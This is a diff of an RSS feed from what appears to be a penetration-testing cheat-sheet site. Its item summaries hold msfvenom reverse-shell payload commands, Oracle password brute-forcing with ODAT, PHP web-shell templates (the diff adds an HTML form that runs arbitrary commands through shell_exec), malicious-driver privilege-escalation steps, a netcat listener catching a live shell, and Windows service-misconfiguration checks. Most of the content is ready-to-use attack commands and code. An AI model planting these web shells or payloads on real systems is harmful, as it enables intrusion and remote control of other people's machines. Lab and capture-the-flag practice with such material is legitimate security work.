@@ -33,13 +33,13 @@
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll Stageless dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
     </item>
     <item>
       <title>Oracle Database</title>
-      <link>https://tldrbins.github.io/oracle/</link>
+      <link>https://tldrbins.github.io/oracledb_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/oracle/</guid>
+      <guid>https://tldrbins.github.io/oracledb_general/</guid>
       <description>Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; # User/Password brute force odat passwordguesser -s &amp;lt;TARGET&amp;gt; -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s &amp;lt;TARGET&amp;gt; -U &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;SID&amp;gt; --sysdba General # Export everytime or add to ~/.</description>
     </item>
     <item>
@@ -47,7 +47,7 @@
       <link>https://tldrbins.github.io/php_cmd_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
-      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
+      <description>Template #1 &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; Template #2 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Command Shell&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { font-family: monospace; margin: 20px; } pre { background: #f4f4f4; padding: 10px; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;GET&amp;#34; action=&amp;#34;&amp;lt;?php echo htmlspecialchars(basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;])); ?&amp;gt;&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;cmd&amp;#34; autofocus&amp;gt; &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Run&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;pre&amp;gt; &amp;lt;?php if (isset($_GET[&amp;#39;cmd&amp;#39;])) { $cmd = trim($_GET[&amp;#39;cmd&amp;#39;]); if (!empty($cmd)) { echo htmlspecialchars(shell_exec($cmd . &amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;), ENT_QUOTES, &amp;#39;UTF-8&amp;#39;); } } ?&amp;gt; &amp;lt;/pre&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; </description>
     </item>
     <item>
       <title>SeDebugPrivilege</title>
@@ -61,21 +61,21 @@
       <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
-      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
+      <description>Abuse #1: Install a Malicious Driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
     </item>
     <item>
       <title>Upgrade Shell</title>
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
+      <description>Check Installed Binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
     </item>
     <item>
       <title>Windows Services</title>
       <link>https://tldrbins.github.io/server_operators/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/server_operators/</guid>
-      <description>Check unquoted service path cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; PS C:\Users\user1&amp;gt; cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; WC Assistant WCAssistantService C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe Auto Check service ACLs . .\Get-ServiceAcl &amp;#34;&amp;lt;SERVICE&amp;gt;&amp;#34; | Get-ServiceAcl | Select -ExpandProperty Access PS &amp;gt; &amp;#34;SomeService&amp;#34; | Get-ServiceAcl | select -ExpandProperty Access ---[SNIP]--- ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : COMPUTER-MS01\user IsInherited : False InheritanceFlags : None PropagationFlags : None ---[SNIP]--- Ref: Get-ServiceAcl.</description>
+      <description>Check Unquoted Service Path cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; PS C:\Users\user1&amp;gt; cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; WC Assistant WCAssistantService C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe Auto Check Service ACLs . .\Get-ServiceAcl &amp;#34;&amp;lt;SERVICE&amp;gt;&amp;#34; | Get-ServiceAcl | Select -ExpandProperty Access PS &amp;gt; &amp;#34;SomeService&amp;#34; | Get-ServiceAcl | select -ExpandProperty Access ---[SNIP]--- ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : COMPUTER-MS01\user IsInherited : False InheritanceFlags : None PropagationFlags : None ---[SNIP]--- Ref: Get-ServiceAcl.</description>
     </item>
   </channel>
 </rss>
